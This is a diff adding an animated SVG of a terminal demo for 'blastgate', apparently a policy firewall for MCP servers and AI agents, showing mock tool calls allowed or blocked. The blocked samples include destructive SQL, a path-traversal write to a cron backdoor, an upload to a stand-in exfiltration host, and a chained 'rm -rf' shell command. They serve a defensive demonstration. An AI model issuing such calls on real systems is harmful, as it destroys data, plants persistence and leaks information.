@@ -1,0 +1,51 @@
+<svg xmlns="http://www.w3.org/2000/svg" xml:space="preserve" width="1124" height="524" viewBox="0 0 1124 524" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="14">
+<style>@keyframes l0{0%,0.00%{opacity:0}0.50%,97%{opacity:1}100%{opacity:0}} .l0{animation:l0 12.36s infinite}
+@keyframes l1{0%,2.59%{opacity:0}3.09%,97%{opacity:1}100%{opacity:0}} .l1{animation:l1 12.36s infinite}
+@keyframes l2{0%,5.18%{opacity:0}5.68%,97%{opacity:1}100%{opacity:0}} .l2{animation:l2 12.36s infinite}
+@keyframes l3{0%,7.77%{opacity:0}8.27%,97%{opacity:1}100%{opacity:0}} .l3{animation:l3 12.36s infinite}
+@keyframes l4{0%,10.36%{opacity:0}10.86%,97%{opacity:1}100%{opacity:0}} .l4{animation:l4 12.36s infinite}
+@keyframes l5{0%,12.94%{opacity:0}13.44%,97%{opacity:1}100%{opacity:0}} .l5{animation:l5 12.36s infinite}
+@keyframes l6{0%,15.53%{opacity:0}16.03%,97%{opacity:1}100%{opacity:0}} .l6{animation:l6 12.36s infinite}
+@keyframes l7{0%,18.12%{opacity:0}18.62%,97%{opacity:1}100%{opacity:0}} .l7{animation:l7 12.36s infinite}
+@keyframes l8{0%,20.71%{opacity:0}21.21%,97%{opacity:1}100%{opacity:0}} .l8{animation:l8 12.36s infinite}
+@keyframes l9{0%,23.30%{opacity:0}23.80%,97%{opacity:1}100%{opacity:0}} .l9{animation:l9 12.36s infinite}
+@keyframes l10{0%,25.89%{opacity:0}26.39%,97%{opacity:1}100%{opacity:0}} .l10{animation:l10 12.36s infinite}
+@keyframes l11{0%,28.48%{opacity:0}28.98%,97%{opacity:1}100%{opacity:0}} .l11{animation:l11 12.36s infinite}
+@keyframes l12{0%,31.07%{opacity:0}31.57%,97%{opacity:1}100%{opacity:0}} .l12{animation:l12 12.36s infinite}
+@keyframes l13{0%,33.66%{opacity:0}34.16%,97%{opacity:1}100%{opacity:0}} .l13{animation:l13 12.36s infinite}
+@keyframes l14{0%,36.25%{opacity:0}36.75%,97%{opacity:1}100%{opacity:0}} .l14{animation:l14 12.36s infinite}
+@keyframes l15{0%,38.83%{opacity:0}39.33%,97%{opacity:1}100%{opacity:0}} .l15{animation:l15 12.36s infinite}
+@keyframes l16{0%,41.42%{opacity:0}41.92%,97%{opacity:1}100%{opacity:0}} .l16{animation:l16 12.36s infinite}
+@keyframes l17{0%,44.01%{opacity:0}44.51%,97%{opacity:1}100%{opacity:0}} .l17{animation:l17 12.36s infinite}
+@keyframes l18{0%,46.60%{opacity:0}47.10%,97%{opacity:1}100%{opacity:0}} .l18{animation:l18 12.36s infinite}
+@keyframes l19{0%,49.19%{opacity:0}49.69%,97%{opacity:1}100%{opacity:0}} .l19{animation:l19 12.36s infinite}
+@keyframes l20{0%,51.78%{opacity:0}52.28%,97%{opacity:1}100%{opacity:0}} .l20{animation:l20 12.36s infinite}
+@keyframes l21{0%,54.37%{opacity:0}54.87%,97%{opacity:1}100%{opacity:0}} .l21{animation:l21 12.36s infinite}
+@keyframes l22{0%,56.96%{opacity:0}57.46%,97%{opacity:1}100%{opacity:0}} .l22{animation:l22 12.36s infinite}</style>
+<rect width="100%" height="100%" rx="10" fill="#1e1e2e"/>
+<circle cx="22" cy="20" r="6" fill="#f38ba8"/><circle cx="42" cy="20" r="6" fill="#f9e2af"/><circle cx="62" cy="20" r="6" fill="#a6e3a1"/>
+<text x="562" y="24" text-anchor="middle" fill="#7f849c" font-size="12">blastgate demo</text>
+<text class="l0" x="20" y="58"><tspan fill="#a6e3a1">$</tspan><tspan fill="#cdd6f4"> npx blastgate demo</tspan></text>
+<text class="l1" x="20" y="78"></text>
+<text class="l2" x="20" y="98"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cba6f7" font-weight="700">blastgate demo</tspan><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">deterministic policy firewall for MCP servers and CLI agents</tspan></text>
+<text class="l3" x="20" y="118"><tspan fill="#cdd6f4" opacity="0.6">  upstream: mock-postgres (4 tools, fake data)   policy: demo (5 rules)   approvals: auto-deny</tspan></text>
+<text class="l4" x="20" y="138"></text>
+<text class="l5" x="20" y="158"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> SELECT id, name FROM users LIMIT 5           </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">look around</tspan></text>
+<text class="l6" x="20" y="178"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> DROP TABLE users;                            </tspan><tspan fill="#f38ba8" font-weight="700">DENY  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">no-destructive-sql</tspan></text>
+<text class="l7" x="20" y="198"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> DELETE FROM orders                           </tspan><tspan fill="#f38ba8" font-weight="700">DENY  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">no-destructive-sql</tspan></text>
+<text class="l8" x="20" y="218"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">write_file</tspan><tspan fill="#cdd6f4"> workspace/report.md                          </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">write inside the jail</tspan></text>
+<text class="l9" x="20" y="238"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">write_file</tspan><tspan fill="#cdd6f4"> ../../etc/cron.d/backdoor                    </tspan><tspan fill="#f38ba8" font-weight="700">DENY  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">fs-jail</tspan></text>
+<text class="l10" x="20" y="258"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">http_fetch</tspan><tspan fill="#cdd6f4"> https://api.github.com/repos/bzucker4/bla... </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">allowed domain</tspan></text>
+<text class="l11" x="20" y="278"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">http_fetch</tspan><tspan fill="#cdd6f4"> https://paste.evil-exfil.example/upload?d... </tspan><tspan fill="#f38ba8" font-weight="700">DENY  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">egress-allowlist</tspan></text>
+<text class="l12" x="20" y="298"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">run_shell </tspan><tspan fill="#cdd6f4"> git status &amp;&amp; rm -rf ~/projects              </tspan><tspan fill="#f9e2af" font-weight="700">HOLD  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">approve-destructive-shell &gt; needs approval &gt; auto-denied</tspan></text>
+<text class="l13" x="20" y="318"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> SELECT count(*) FROM events                  </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">retry loop 1/4</tspan></text>
+<text class="l14" x="20" y="338"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> SELECT count(*) FROM events                  </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">retry loop 2/4</tspan></text>
+<text class="l15" x="20" y="358"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> SELECT count(*) FROM events                  </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">retry loop 3/4</tspan></text>
+<text class="l16" x="20" y="378"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> SELECT count(*) FROM events                  </tspan><tspan fill="#f38ba8" font-weight="700">DENY  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">loop-guard</tspan></text>
+<text class="l17" x="20" y="398"></text>
+<text class="l18" x="20" y="418"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" font-weight="700">12 tool calls</tspan><tspan fill="#cdd6f4">: </tspan><tspan fill="#a6e3a1">6 allowed</tspan><tspan fill="#cdd6f4">, </tspan><tspan fill="#f38ba8">6 blocked before reaching the server</tspan><tspan fill="#cdd6f4">. </tspan><tspan fill="#cdd6f4" opacity="0.6">median round trip through the proxy: 1.44 ms</tspan></text>
+<text class="l19" x="20" y="438"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" font-weight="700">audit log</tspan><tspan fill="#cdd6f4">: 18 entries, hash-chained and Ed25519-signed </tspan><tspan fill="#a6e3a1">&gt; verified</tspan></text>
+<text class="l20" x="20" y="458"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" font-weight="700">tamper test</tspan><tspan fill="#cdd6f4">: flip the DROP TABLE decision to "allow" </tspan><tspan fill="#a6e3a1">&gt; detected at line 3: content hash mismatch: this line was edited</tspan></text>
+<text class="l21" x="20" y="478"></text>
+<text class="l22" x="20" y="498"><tspan fill="#cdd6f4" opacity="0.6">  try it on your own agent:  npx blastgate init   then wrap any MCP server with  npx blastgate mcp -- &lt;server command&gt;</tspan></text>
+</svg>
